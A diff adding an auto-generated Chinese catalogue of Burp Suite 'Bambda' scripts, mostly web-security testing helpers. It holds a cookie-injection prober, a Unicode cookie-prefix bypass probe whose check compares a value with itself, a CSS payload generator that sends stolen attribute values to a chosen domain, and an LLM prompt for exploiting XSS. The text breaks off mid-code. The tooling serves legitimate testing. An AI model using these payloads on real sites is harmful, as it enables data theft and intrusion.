@@ -1,0 +1,902 @@
+<!--
+*** 自动生成的文件 ***
+此文件由 BambdaChecker 自动生成。
+请不要手动编辑此文件，或在拉取请求中包含对此文件的更改。
+-->
+# 自定义操作
+文档：[自定义操作](https://portswigger.net/burp/documentation/desktop/tools/repeater/http-messages/custom-actions)
+## [CalculateResponseMetadata.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CalculateResponseMetadata.bambda)
+### 计算响应元数据。
+#### 作者：PortSwigger
+```java
+String responseBody = requestResponse.response().bodyToString();
+logging().logToOutput(responseBody.hashCode());
+logging().logToOutput(responseBody.split("\n").length);
+
+```
+## [CookieInjection.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookieInjection.bambda)
+### 通过参数操作探测 Cookie 注入
+#### 作者：d0ge
+```java
+if(!requestResponse.hasResponse()) return;
+var req = requestResponse.request();
+var res = requestResponse.response();
+
+var originalParameters = req.parameters();
+
+var existingNames = originalParameters.stream()
+    .map(HttpParameter::name)
+    .collect(java.util.stream.Collectors.toSet());
+
+var cookieParameters = res.cookies().stream()
+    .filter(c -> !existingNames.contains(c.name()))
+    .map(c -> HttpParameter.urlParameter(c.name(), c.value()))
+    .toList();
+
+var testParameters = new java.util.ArrayList<HttpParameter>();
+testParameters.addAll(originalParameters);
+testParameters.addAll(cookieParameters);
+
+for(HttpParameter parameter: testParameters) {
+  var canary = api().utilities().randomUtils().randomString(parameter.value().length());
+  HttpParameter injectParameter;
+  if(req.method().equalsIgnoreCase("GET")){
+      injectParameter = HttpParameter.urlParameter(parameter.name(), parameter.value() + canary);
+  } else {
+  	injectParameter = HttpParameter.bodyParameter(parameter.name(), parameter.value() + canary);
+  }
+  var exploit = req.withRemovedParameters(parameter).withAddedParameters(injectParameter);
+  var respRx = api().http().sendRequest(exploit);
+  if (!respRx.hasResponse()) continue;
+  var foundCookies = respRx.response().cookies()
+  	.stream()
+  	.filter(c -> c.name().equalsIgnoreCase(parameter.name()) && c.value().contains(canary))
+     	.collect(Collectors.toList());
+  if(foundCookies.isEmpty()) continue;
+  logging().logToOutput(String.format(
+  "[INFO] Cookie override detected: server reflected injected value in Set-Cookie header: %s=%s%s",
+  parameter.name(), parameter.value(), canary));
+  var attr = api().utilities().randomUtils().randomString(4);
+  var attributeExploit = req.withRemovedParameters(parameter).withAddedParameters(HttpParameter.parameter(injectParameter.name(), injectParameter.value() + "%3b" + attr, injectParameter.type()));
+  var attrRx = api().http().sendRequest(attributeExploit);
+  if (!attrRx.hasResponse()) continue;
+
+  if(!attrRx.response().headers().stream().filter(t -> t.name().equalsIgnoreCase("Set-Cookie")).anyMatch(t -> t.value().contains(";"+attr))) continue;
+  logging().logToOutput(String.format(
+  "[INFO] Cookie attribute override detected: server accepted injected attribute: %s", attr));
+  api().siteMap().add(
+  burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
+	"Cookie Injection via Parameter Manipulation",
+	"The server allows user-controlled request parameters to modify response cookies. This includes both overwriting cookie values and injecting new cookie attributes using semicolons <b>;</b>.",
+	String.format(
+	  "During testing, the parameter <b>%s</b> was modified to include an injected value: <b>%s%s</b>. " +
+	  "The server reflected this value in the <b>Set-Cookie</b> header. Further testing showed the server accepted an injected attribute: <b>%s</b>, " +
+	  "indicating improper input sanitization when constructing cookie headers.",
+	  parameter.name(), parameter.value(), canary, attr),
+	req.url(),
+	burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.LOW,
+	burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.CERTAIN,
+	"To prevent cookie injection, avoid directly embedding user-controlled input into Set-Cookie headers. Sanitize all cookie values and avoid using delimiters like semicolons <b>;</b>. " +
+	"More details: <a href=\"https://portswigger.net/research/cookie-chaos\">https://portswigger.net/research/cookie-chaos</a>",
+	"",
+	burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.LOW,
+	respRx.withResponseMarkers(Marker.marker(Range.range(respRx.response().toString().indexOf(canary), attrRx.response().toString().indexOf(canary) + canary.length()))), 
+    attrRx.withResponseMarkers(Marker.marker(Range.range(attrRx.response().toString().indexOf(attr), attrRx.response().toString().indexOf(attr) + 4)))));
+}
+
+```
+## [CookiePrefixBypass.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/CookiePrefixBypass.bambda)
+### 探测 Cookie 前缀绕过攻击
+#### 作者：d0ge
+```java
+  if (!requestResponse.hasResponse()) return;
+
+  var req = requestResponse.request();
+  var res = requestResponse.response();
+
+  var map = new java.util.LinkedHashMap<String, HttpParameter>();
+  res.cookies().stream()
+     .filter(c -> c.name().startsWith("__Host-") || c.name().startsWith("__Secure-"))
+      .forEach(c -> map.put(c.name(), HttpParameter.cookieParameter(c.name(), c.value())));
+  req.parameters().stream()
+      .filter(p -> p.type() == HttpParameterType.COOKIE
+               && (p.name().startsWith("__Host-") || p.name().startsWith("__Secure-")))
+      .forEach(p -> map.put(p.name(), HttpParameter.cookieParameter(p.name(), p.value())));
+
+  var merged = new java.util.ArrayList<>(map.values());
+  if (merged.isEmpty()) {
+    logging().logToOutput("[INFO] No '__Host-' or '__Secure-' cookies found in response.");
+    return;
+  }
+  var exploit = req
+      .withRemovedParameters(merged)
+      .withAddedParameters(
+          merged.stream()
+                .map(p -> HttpParameter.cookieParameter("§§§" + p.name(), p.value()))
+                .toList()
+      );
+  var downgrade = exploit.toString().replaceFirst("HTTP/2","HTTP/1.1");
+  var prob = downgrade.replaceAll("§§§", "");
+  var prob1 = api().http().sendRequest(HttpRequest.httpRequest(req.httpService(), prob), HttpMode.HTTP_1);
+  if(!prob1.hasResponse()) {
+  	logging().logToError("[ERROR] HTTP/1.1 is not supported by the server.");
+    return;
+  }
+  var attributes1 = prob1.response().attributes(AttributeType.COOKIE_NAMES);
+
+  var data = ByteArray.byteArray(downgrade);
+  int idx;
+  while ((idx = data.indexOf("§§§")) != -1) {
+      data.setByte(idx,   (byte) 0xE2);
+      data.setByte(idx+1, (byte) 0x80);
+      data.setByte(idx+2, (byte) 0x80);
+  }
+
+  var respRx = api().http()
+      .sendRequest(HttpRequest.httpRequest(
+          req.httpService(), data), HttpMode.HTTP_1);
+  if (!respRx.hasResponse()) return;
+  var attributes2 = respRx.response().attributes(AttributeType.COOKIE_NAMES);
+  if(attributes1.getFirst().value() ==  attributes1.getFirst().value()) {
+    logging().logToOutput("[WARNING] Potential secure-prefix bypass detected! Check 'All issues' Tab for details.");
+    api().siteMap().add(
+    burp.api.montoya.scanner.audit.issues.AuditIssue.auditIssue(
+        "Cookie Prefix Bypass",
+        "The server appears to be vulnerable to a <b>Unicode-based bypass</b> affecting cookies with the <b>__Host-</b> or <b>__Secure-</b> prefix. This issue exploits RFC6265bis trimming behavior, allowing an attacker to set privileged cookies using visually similar names.",
+        "Ensure the server does not silently strip or normalize <i>Unicode space separator characters</i> (e.g. U+2000–U+200A) before parsing cookie names. These characters can be used to bypass prefix restrictions in modern browsers like Chrome and Firefox.",
+        req.url(),
+        burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.LOW,
+        burp.api.montoya.scanner.audit.issues.AuditIssueConfidence.TENTATIVE,
+        "For technical background on Unicode-based cookie prefix bypasses, see: <a href=\"https://portswigger.net/research/cookie-chaos\">https://portswigger.net/research/cookie-chaos</a>",
+        "",
+        burp.api.montoya.scanner.audit.issues.AuditIssueSeverity.LOW,
+        respRx
+    )
+);
+  } else {
+    logging().logToOutput("[NOTICE] Response cookie headers differ — manual review recommended.");
+    logging().logToOutput("[DEBUG] Baseline response headers:");
+  	logging().logToOutput(
+  	    prob1.response()
+  	          .headers()
+  	          .stream()
+  				.filter(h -> h.name().equalsIgnoreCase("set-cookie"))
+  	          .map(Object::toString)
+  	          .collect(Collectors.joining("\n"))
+  	);
+  }
+  logging().logToOutput("[DEBUG] Request cookies: ");
+  logging().logToOutput(merged.stream()
+            .map(t -> t.name() + "=" + t.value())
+            .collect(Collectors.joining("\n"))
+  );
+  logging().logToOutput("[DEBUG] Attack response headers:");
+  logging().logToOutput(
+      respRx.response()
+            .headers()
+            .stream()
+  			.filter(h -> h.name().equalsIgnoreCase("set-cookie"))
+            .map(Object::toString)
+            .collect(Collectors.joining("\n"))
+  );
+
+```
+## [HackingAssistant.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/HackingAssistant.bambda)
+### 创建一个 AI 助手，可以根据用户提供的提示中的指令修改 HTTP 请求。示例指令包括"利用此 XSS"或"URL 编码此内容"
+#### 作者：Gareth Heyes
+```java
+var selectedText = (selection.hasRequestSelection() ? selection.requestSelection() : selection.responseSelection()).contents().toString();
+
+var userPrompt = javax.swing.JOptionPane.showInputDialog(null, "Enter a AI prompt to run on the selection", "AI Prompt", javax.swing.JOptionPane.QUESTION_MESSAGE);
+
+if(userPrompt == null) return;
+
+var systemPrompt = """
+You are an assistant inside Burp Suite's Repeater. 
+The user is going to give you a LLM prompt and some selected input, a HTTP request and response as a JSON object. 
+You should do what the user requests and bear in mind it's used for web security research.
+You should always return your response as a JSON object. Do not output markdown. Your response should always start with "{".
+Your response should always end with "}".
+If the user asks you to modify request you can return a property called modified request where you should place the modified request.
+The description field should contain a short description of what you've done.
+The JSON object should always be returned like this:
+{
+  "modifiedRequest": string
+  "description": string
+}
+""";
+
+var jsonInput = JsonObjectNode.jsonObjectNode();
+jsonInput.putString("Selected text", selectedText);
+jsonInput.putString("Request", requestResponse.request().toString());
+jsonInput.putString("Response", requestResponse.response().toString());
+
+var aiResponse = api.ai().prompt().execute(PromptOptions.promptOptions().withTemperature(1.0), 
+Message.systemMessage(systemPrompt), Message.userMessage(userPrompt + "\n\n" + jsonInput.toJsonString())
+).content();
+
+aiResponse = aiResponse.replaceFirst("^\\s*```json","");
+aiResponse = aiResponse.replaceFirst("\\s*```$","");
+
+if(!api.utilities().jsonUtils().isValidJson(aiResponse)) {
+   logging().logToError("The AI returned invalid json:" + aiResponse);
+   return;
+}
+
+var modifiedRequest = api().utilities().jsonUtils().readString(aiResponse, "modifiedRequest");
+var description = api().utilities().jsonUtils().readString(aiResponse, "description");
+
+if(modifiedRequest != null) {
+    httpEditor.requestPane().set(modifiedRequest);
+}
+
+api.logging().logToOutput(description);
+
+```
+## [InlineStyleAttributeStealer.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda)
+### 此脚本创建一些示例 HTML 代码和内联样式，仅使用内联样式来窃取属性值。它支持通过 Java 输入对话框获取的 4 个参数：1. 属性 - 您要窃取的属性名称 2. 域前缀 - 您要将数据泄露到的域 3. 值 - 要泄露的最大数量或逗号分隔的值列表 4. 默认值 - 应放置在属性值中的默认值
+#### 作者：Gareth Heyes
+```java
+var attribute = javax.swing.JOptionPane.showInputDialog(null, "Enter attribute you want to steal", "Attribute", javax.swing.JOptionPane.QUESTION_MESSAGE);
+if(attribute == null) return;
+var domainPrefix = javax.swing.JOptionPane.showInputDialog(null, "Enter domain you want the value sent to", "Domain", javax.swing.JOptionPane.QUESTION_MESSAGE);
+if(domainPrefix == null) return;
+var value = javax.swing.JOptionPane.showInputDialog(null, "Enter comma separated list of data or a max numeric value", "Value", javax.swing.JOptionPane.QUESTION_MESSAGE);
+if(value == null) return;
+var defaultValue = javax.swing.JOptionPane.showInputDialog(null, "Enter default value to steal", "Default value", javax.swing.JOptionPane.QUESTION_MESSAGE);
+if(defaultValue == null) return;
+var chain = "";
+
+if(value.contains(",")) {
+  var values = value.split(",");
+  chain = "url(" + domainPrefix + "/" + values[values.length-1] + ")";
+  if(values.length < 2) return;
+
+  for (var i = values.length - 2; i > 0; i--) {
+      chain = String.format("if(style(--val:\"%s\"): url(%s/%s); else: %s)", values[i], domainPrefix, values[i], chain);
+  }
+
+  } else {
+    var maxVal = Integer.parseInt(value);
+    chain = "url(" + domainPrefix + "/" + maxVal + ")";
+    for (var i = maxVal - 1; i > 0; i--) {
+        chain = String.format("if(style(--val:\"%d\"): url(%s/%d); else: %s)", i, domainPrefix, i, chain);
+    }
+}
+
+var styleStr = String.format("--val: attr(%s); --steal: %s; background: image-set(var(--steal));", attribute, chain);
+var html = "<div style='" + styleStr + "' "+attribute+"=\""+defaultValue+"\"></div>";
+logging().logToOutput(html);
+
+```
+## [InsertHVTagsSpaceAndNewline.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InsertHVTagsSpaceAndNewline.bambda)
+### 用相应的 Hackvertor 标签替换空格和换行符
+#### 作者：Nicolas Grégoire
+```java
+var data = "";
+if (selection.hasRequestSelection()) {
+    logging().logToOutput("Acting on selected text");
+    data = selection.requestSelection().contents().toString();
+} else {
+    logging().logToOutput("Acting on the whole body");
+    data = requestResponse.request().bodyToString();
+}
+logging().logToOutput(data.replace(" ", "<@space/>").replace("\n", "<@newline/>"));
+
+```
+## [NavigateAsAnonAndLookForDifferences.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/NavigateAsAnonAndLookForDifferences.bambda)
+### 匿名导航（无 cookies，无 Authorization 头）并查找差异
+#### 作者：Nicolas Grégoire
+```java
+var resp1 = requestResponse.response();
+var resp1_metadata = resp1.statusCode() + "." + resp1.headerValue("Content-Length");
+
+var resp2 = api().http().sendRequest(requestResponse.request().withRemovedHeader("Authorization").withRemovedHeader("Cookie")).response();
+var resp2_metadata = resp2.statusCode() + "." + resp2.headerValue("Content-Length");
+
+if (resp1_metadata.equals(resp2_metadata)) {
+    logging().logToOutput("Identical");
+} else {
+    logging().logToOutput(resp1_metadata + " vs " + resp2_metadata);
+}
+
+```
+## [PerformReverseDNSLookup.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/PerformReverseDNSLookup.bambda)
+### 执行反向 DNS 查找。
+#### 作者：PortSwigger
+```java
+logging().logToOutput(java.net.InetAddress.getByName(requestResponse.httpService().ipAddress()).getCanonicalHostName());
+
+```
+## [PerformWebAPILookup.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/PerformWebAPILookup.bambda)
+### 执行 Web API 查找。
+#### 作者：PortSwigger
+```java
+// Change apiURL, and add data from requestResponse or selection if required
+var apiURL = "https://portswigger.net/research/rss";
+var responseBody = api().http().sendRequest(HttpRequest.httpRequestFromUrl(apiURL)).response().bodyToString();
+
+// Change the regex to suit your response. If it's JSON, consider using utilities().jsonUtils()
+var extractedData = responseBody.split("<item>")[1].split("<link>")[1].split("<")[0];
+logging().logToOutput(extractedData);
+
+```
+## [ProbeForRaceCondition.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/ProbeForRaceCondition.bambda)
+### 重复请求 10 次以触发竞态条件或请求走私，对 HTTP/2 使用单包攻击，对 HTTP/1 使用最后字节同步
+#### 作者：James Kettle
+```java
+int NUMBER_OF_REQUESTS = 10;
+var reqs = new ArrayList<HttpRequest>();
+for (int i = 0; i < NUMBER_OF_REQUESTS; i++) {
+    reqs.add(requestResponse.request());
+}
+
+var responses = api().http().sendRequests(reqs); 
+var codes = responses.stream().map(HttpRequestResponse::response).map(HttpResponse::statusCode).toList();
+logging().logToOutput(codes);
+
+```
+## [RepeaterClipNewFromClipboard.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/RepeaterClipNewFromClipboard.bambda)
+### 给定剪贴板包含由 RepeaterClip Bambda 压缩和编码的 repeater 请求，此 Bambda 创建包含该请求的新 Repeater 选项卡。
+#### 作者：0xd0ug (https://github.com/0xd0ug)
+```java
+
+try {
+    String clipboardContent = (String) java.awt.Toolkit.getDefaultToolkit().getSystemClipboard().getData(java.awt.datatransfer.DataFlavor.stringFlavor);
+
+    if (clipboardContent == null || !clipboardContent.startsWith("REPEATERCLIP/")) {
+        logging.logToError("Invalid clipboard content. Expected format: REPEATERCLIP/protocol/host/port/base64data");
+        return;
+    }
+
+    String[] parts = clipboardContent.split("/", 5);
+    if (parts.length != 5) {
+        logging.logToError("Invalid clipboard format. Expected 5 parts separated by '/'");
+        return;
+    }
+
+    String protocol = parts[1];
+    String host = parts[2];
+    int port = Integer.parseInt(parts[3]);
+    String base64Data = parts[4];
+
+    var decodedData = api.utilities().base64Utils().decode(burp.api.montoya.core.ByteArray.byteArray(base64Data));
+    var decompressedRequest = api.utilities().compressionUtils().decompress(decodedData, burp.api.montoya.utilities.CompressionType.GZIP);
+
+    boolean isSecure = "https".equals(protocol);
+    var httpService = burp.api.montoya.http.HttpService.httpService(host, port, isSecure);
+    var restoredRequest = burp.api.montoya.http.message.requests.HttpRequest.httpRequest(httpService, decompressedRequest);
+
+    api.repeater().sendToRepeater(restoredRequest);
+
+    logging.logToOutput("Successfully restored request from clipboard and sent to new Repeater tab");
+    logging.logToOutput("Protocol: " + protocol + ", Host: " + host + ", Port: " + port);
+
+} catch (Exception e) {
+    logging.logToError("Error restoring request from clipboard: " + e.getMessage());
+    e.printStackTrace();
+}
+
+```
+## [RepeaterClipShareToClipboard.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/RepeaterClipShareToClipboard.bambda)
+### 压缩并编码当前 repeater 请求，将结果复制到剪贴板。
+#### 作者：0xd0ug (https://github.com/0xd0ug)
+```java
+
+try {
+    var httpService = requestResponse.httpService();
+    String protocol = httpService.secure() ? "https" : "http";
+    String host = httpService.host();
+    int port = httpService.port();
+
+    var requestByteArray = requestResponse.request().toByteArray();
+
+    var compressedRequest = api.utilities().compressionUtils().compress(requestByteArray, burp.api.montoya.utilities.CompressionType.GZIP);
+
+    String base64EncodedRequest = api.utilities().base64Utils().encodeToString(compressedRequest);
+
+    String result = "REPEATERCLIP/" + protocol + "/" + host + "/" + port + "/" + base64EncodedRequest;
+
+    java.awt.Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new java.awt.datatransfer.StringSelection(result), null);
+
+    logging.logToOutput("Successfully copied request data to clipboard");
+    logging.logToOutput("Format: " + protocol + "/" + host + "/" + port + "/[base64-encoded-compressed-request]");
+
+} catch (Exception e) {
+    try {
+        java.awt.Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new java.awt.datatransfer.StringSelection(""), null);
+    } catch (Exception clipboardError) {
+        logging.logToError("Failed to clear clipboard: " + clipboardError.getMessage());
+    }
+
+    logging.logToError("Error processing request: " + e.getMessage());
+    e.printStackTrace();
+}
+
+```
+## [RetryRequestWithoutCookies.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/RetryRequestWithoutCookies.bambda)
+### 重试不带 cookies 的请求。
+#### 作者：PortSwigger
+```java
+var req = requestResponse.request();
+logging().logToOutput(api().http().sendRequest(req.withRemovedHeader("Authorization").withRemovedHeader("Cookie")).response().statusCode());
+
+```
+## [RetryUntilSuccess.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/RetryUntilSuccess.bambda)
+### 重复请求直到观察到不同的状态码
+#### 作者：James Kettle (https://github.com/albinowax)
+```java
+var httpVersion = requestResponse.request().httpVersion().equals("HTTP/2") ? HttpMode.HTTP_2 : HttpMode.HTTP_1;
+var maxAttempts = 20;
+var boringStatus = requestResponse.response().statusCode();
+
+for (int i=0; i<maxAttempts; i++) {
+ 	    var attack = api().http().sendRequest(requestResponse.request(), httpVersion);
+		var status = attack.response().statusCode();
+    	logging().logToOutput(status+",");
+    	if (status != boringStatus) {
+			httpEditor.responsePane().set(attack.response().toByteArray());
+        	break;
+    	}
+}
+
+```
+## [Screenshot.bambda](https://github.com/PortSwigger/bambdas/blob/main/CustomAction/Screenshot.bambda)
+### 直接从 Repeater 创建和编辑截图。
+#### 作者：Martin Doyhenard
+```java
+
+final int BORDER = 5, GRIP = 6, BTN_W = 90, BTN_H = 30;
+final javax.swing.JWindow overlay = new javax.swing.JWindow();
+overlay.setBounds(200, 200, 600, 350);
+overlay.setAlwaysOnTop(true);
+
+java.awt.Color CLEAR = new java.awt.Color(0, 0, 0, 0);
+overlay.setBackground(CLEAR);
+((javax.swing.JComponent) overlay.getContentPane()).setOpaque(false);
+overlay.getRootPane().setOpaque(false);
+overlay.getContentPane().setLayout(null);
+
+/* ── hollow overlay shape ─────────────────────────────────── */
+java.awt.geom.Area hole = new java.awt.geom.Area(
+        new java.awt.Rectangle(0, 0, overlay.getWidth(), overlay.getHeight()));
+hole.subtract(new java.awt.geom.Area(
+        new java.awt.Rectangle(BORDER, BORDER,
+                overlay.getWidth() - BORDER * 2, overlay.getHeight() - BORDER * 2)));
+hole.add(new java.awt.geom.Area(
+        new java.awt.Rectangle(BORDER + 2, BORDER + 2, BTN_W + 4, BTN_H + 4)));
+overlay.setShape(hole);
+overlay.addComponentListener(new java.awt.event.ComponentAdapter() {
+    public void componentResized(java.awt.event.ComponentEvent e) {
+        int w = overlay.getWidth(), h = overlay.getHeight();
+        java.awt.geom.Area a = new java.awt.geom.Area(new java.awt.Rectangle(0, 0, w, h));
+        a.subtract(new java.awt.geom.Area(
+                new java.awt.Rectangle(BORDER, BORDER, w - BORDER * 2, h - BORDER * 2)));
+        a.add(new java.awt.geom.Area(
+                new java.awt.Rectangle(BORDER + 2, BORDER + 2, BTN_W + 4, BTN_H + 4)));
+        overlay.setShape(a);
+    }
+});
+
+/* ── red frame ─────────────────────────────────────────────── */
+overlay.setContentPane(new javax.swing.JComponent() {
+    { setOpaque(false); setLayout(null); }
+    protected void paintComponent(java.awt.Graphics g) {
+        java.awt.Graphics2D g2 = (java.awt.Graphics2D) g.create();
+        g2.setColor(java.awt.Color.BLACK);
+        g2.setStroke(new java.awt.BasicStroke(BORDER));
+        g2.drawRect(BORDER / 2, BORDER / 2,
+                     getWidth() - BORDER, getHeight() - BORDER);
+        g2.dispose();
+    }
+});
+
+/* ── Capture button (draggable) ────────────────────────────── */
+final javax.swing.JButton capture = new javax.swing.JButton("Capture  ↵");
+capture.setBounds(BORDER + 4, BORDER + 4, BTN_W, BTN_H);
+capture.setFont(capture.getFont().deriveFont(
+        java.awt.Font.BOLD, capture.getFont().getSize()));
+
+overlay.getContentPane().add(capture);
+java.awt.event.MouseAdapter dragBtn = new java.awt.event.MouseAdapter() {
+    java.awt.Point off;
+    public void mousePressed(java.awt.event.MouseEvent e){ off = e.getPoint(); }
+    public void mouseDragged(java.awt.event.MouseEvent e){
+        java.awt.Point p = javax.swing.SwingUtilities.convertPoint(
+                capture, e.getPoint(), overlay.getContentPane());
+        capture.setLocation(p.x - off.x, p.y - off.y);
+    }
+};
+capture.addMouseListener(dragBtn); capture.addMouseMotionListener(dragBtn);
+
+/* ── overlay move / resize ─────────────────────────────────── */
+java.awt.event.MouseAdapter mover = new java.awt.event.MouseAdapter() {
+    java.awt.Point start; java.awt.Rectangle startB; int edge;
+    int edges(java.awt.Point p){
+        int m = 0;
+        if (p.x >= overlay.getWidth() - GRIP) m |= 1;
+        if (p.y >= overlay.getHeight() - GRIP) m |= 2;
+        if (p.x <= GRIP)                    m |= 4;
+        if (p.y <= GRIP)                    m |= 8;
+        return m;
+    }
+    public void mousePressed(java.awt.event.MouseEvent e){
+        start = e.getLocationOnScreen(); startB = overlay.getBounds();
+        edge = edges(e.getPoint());
+    }
+    public void mouseDragged(java.awt.event.MouseEvent e){
+        java.awt.Point now = e.getLocationOnScreen();
+        int dx = now.x - start.x, dy = now.y - start.y;
+        java.awt.Rectangle r = new java.awt.Rectangle(startB);
+        if(edge == 0){ r.x += dx; r.y += dy; }
+        else{
+            if((edge & 1) != 0) r.width  += dx;
+            if((edge & 2) != 0) r.height += dy;
+            if((edge & 4) != 0){ r.x += dx; r.width  -= dx; }
+            if((edge & 8) != 0){ r.y += dy; r.height -= dy; }
+            r.width  = java.lang.Math.max(120, r.width);
+            r.height = java.lang.Math.max( 90, r.height);
+        }
+        overlay.setBounds(r);
+    }
+};
+overlay.addMouseListener(mover); overlay.addMouseMotionListener(mover);
+
+java.awt.KeyboardFocusManager kfm = java.awt.KeyboardFocusManager.getCurrentKeyboardFocusManager();
+java.awt.KeyEventDispatcher dispatch = new java.awt.KeyEventDispatcher(){      // ★ NEW
+    public boolean dispatchKeyEvent(java.awt.event.KeyEvent e){
+        if(e.getID()!=java.awt.event.KeyEvent.KEY_PRESSED) return false;
+        if(!overlay.isVisible()) return false;                                  // ★ NEW
+        int code=e.getKeyCode();
+        if(code==java.awt.event.KeyEvent.VK_ENTER){ capture.doClick(); return true; }
+        if(code==java.awt.event.KeyEvent.VK_ESCAPE){ overlay.dispose(); return true; }
+        return false;
+    }
+};
+kfm.addKeyEventDispatcher(dispatch); 
+
+
+/* ═══════════ 2. After Capture – editor ═════════════════════ */
+capture.addActionListener(ev -> {
+    try{
+        /* ----- take screenshot ----- */
+        java.awt.Rectangle reg = overlay.getBounds();
+        overlay.setVisible(false);
+        java.awt.Toolkit.getDefaultToolkit().sync();
+        java.lang.Thread.sleep(250);
+        java.awt.image.BufferedImage snap =
+            new java.awt.Robot(overlay.getGraphicsConfiguration().getDevice())
+                .createScreenCapture(reg);
+        overlay.dispose();
+
+        /* ----- basic frame + root ----- */
+        final javax.swing.JFrame editor = new javax.swing.JFrame("Screenshot Editor");
+        editor.setDefaultCloseOperation(javax.swing.JFrame.DISPOSE_ON_CLOSE);
+        java.awt.Color FRAME_GRAY = java.awt.Color.DARK_GRAY;
+        editor.getRootPane().setBorder(
+                javax.swing.BorderFactory.createLineBorder(FRAME_GRAY,2));
+        javax.swing.JPanel root = new javax.swing.JPanel(new java.awt.BorderLayout());
+        editor.setContentPane(root);
+
+        /* ----- image in a layered pane ----- */
+        javax.swing.JLabel img = new javax.swing.JLabel(new javax.swing.ImageIcon(snap));
+        javax.swing.JLayeredPane stack = new javax.swing.JLayeredPane();
+        img.setBounds(0,0,snap.getWidth(),snap.getHeight());
+        stack.add(img, java.lang.Integer.valueOf(0));
+
+        /* ----- canvas (null layout), image pinned top-left ----- */
+        int minW = java.lang.Math.max(500, snap.getWidth() + 24);
+        int minH = java.lang.Math.max(350, snap.getHeight() + 24);
+        javax.swing.JPanel canvas = new javax.swing.JPanel(null);
+        canvas.setBackground(FRAME_GRAY);
+        canvas.setBorder(javax.swing.BorderFactory.createMatteBorder(
+                12,12,12,12, FRAME_GRAY));
+        canvas.setPreferredSize(new java.awt.Dimension(minW, minH));
+        stack.setBounds(0,0,snap.getWidth(),snap.getHeight());
+        canvas.add(stack);
+
+        canvas.addComponentListener(new java.awt.event.ComponentAdapter() {
+    public void componentResized(java.awt.event.ComponentEvent e) {
+        int cw = canvas.getWidth()  - 24;   
+        int ch = canvas.getHeight() - 24;
+        int sx = (cw - snap.getWidth())  / 2;
+        int sy = (ch - snap.getHeight()) / 2;
+        stack.setBounds(12 + Math.max(0, sx),
+                        12 + Math.max(0, sy),
+                        snap.getWidth(), snap.getHeight());
+    }
+});
+canvas.dispatchEvent(
+    new java.awt.event.ComponentEvent(canvas,
+        java.awt.event.ComponentEvent.COMPONENT_RESIZED));
+
+        root.add(canvas, java.awt.BorderLayout.CENTER);
+
+        /* ----- drawing state ----- */
+        final java.util.List<java.awt.Shape> shapes = new java.util.ArrayList<>();
+        final java.util.List<java.awt.Color> cols   = new java.util.ArrayList<>();
+        final java.util.List<java.lang.String> kinds= new java.util.ArrayList<>();
+        final java.awt.Color[]  curCol = { java.awt.Color.RED };
+        final java.lang.String[] mode  = { "RECT" };   // RECT, LINE, DRAW, HIGHLIGHT, REDACT
+        final java.awt.Point[]  start  = { null };
+        final java.awt.Shape[]  preview= { null };
+
+        /* helper → icon generator (16×16) */
+        java.util.function.BiFunction<java.awt.Color,java.lang.String,javax.swing.Icon> makeIcon = (c,t)->{
+            java.awt.image.BufferedImage bi = new java.awt.image.BufferedImage(
+                    16,16,java.awt.image.BufferedImage.TYPE_INT_ARGB);
+            java.awt.Graphics2D g = bi.createGraphics();
+            g.setRenderingHint(java.awt.RenderingHints.KEY_ANTIALIASING,
+                               java.awt.RenderingHints.VALUE_ANTIALIAS_ON);
+            if("RECT".equals(t)){ g.setColor(c); g.setStroke(new java.awt.BasicStroke(2f)); g.drawRect(2,2,11,11); }
+            else if("LINE".equals(t)){ g.setColor(c); g.setStroke(new java.awt.BasicStroke(3f)); g.drawLine(2,13,13,2); }
+            else if("DRAW".equals(t)){ g.setColor(c); g.setStroke(new java.awt.BasicStroke(2f)); g.drawPolyline(new int[]{2,5,9,13},new int[]{12,7,10,3},4); }
+            else if("HIGHLIGHT".equals(t)){ g.setColor(new java.awt.Color(c.getRed(),c.getGreen(),c.getBlue(),120)); g.fillRect(2,4,12,8); g.setColor(java.awt.Color.DARK_GRAY); g.drawRect(2,4,12,8); }
+            else if("REDACT".equals(t)){ g.setColor(java.awt.Color.BLACK); g.fillRect(2,2,12,12); }
+            g.dispose(); return new javax.swing.ImageIcon(bi);
+        };
+
+        /* ----- drawing layer ----- */
+        final javax.swing.JComponent draw = new javax.swing.JComponent(){
+            { setOpaque(false); }
+            protected void paintComponent(java.awt.Graphics g){
+                java.awt.Graphics2D g2=(java.awt.Graphics2D)g.create();
+                g2.setStroke(new java.awt.BasicStroke(3f));
+                for(int i=0;i<shapes.size();i++){
+                    g2.setColor(cols.get(i));
+                    if("HIGHLIGHT".equals(kinds.get(i))||"REDACT".equals(kinds.get(i)))
+                        g2.fill(shapes.get(i));
+                    else g2.draw(shapes.get(i));
+                }
+                if(preview[0]!=null){
+                    g2.setColor("REDACT".equals(mode[0])?java.awt.Color.BLACK:curCol[0]);
+                    if("HIGHLIGHT".equals(mode[0])||"REDACT".equals(mode[0]))
+                        g2.fill(preview[0]);
+                    else g2.draw(preview[0]);
+                }
+                g2.dispose();
+            }
+        };
+        draw.setBounds(0,0,snap.getWidth(),snap.getHeight());
+        stack.add(draw, java.lang.Integer.valueOf(100));
+
+        /* ----- mouse for drawing ----- */
+        java.awt.event.MouseAdapter dm = new java.awt.event.MouseAdapter(){
+            java.awt.geom.Path2D path;
+            public void mousePressed(java.awt.event.MouseEvent e){
